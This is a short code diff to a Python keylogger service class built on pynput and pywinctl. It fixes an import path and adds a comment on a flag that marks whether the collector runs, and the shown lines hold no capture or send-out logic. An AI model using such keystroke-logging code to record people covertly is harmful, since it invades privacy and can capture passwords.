@@ -3,7 +3,7 @@ import time
 from pynput.keyboard import Key, Controller
 
 from pynput import keyboard
-from i_key_logger_service import IKeloggerService
+from .i_key_logger_service import IKeloggerService
 from pywinctl import getActiveWindowTitle
 import threading
 
@@ -11,7 +11,7 @@ import threading
 class KeyLoggerService(IKeloggerService):
 
     storage = {} # Store the data
-    runner = False
+    runner = False # Sign if the collector runs
 
     @property
     def __window_name(self):
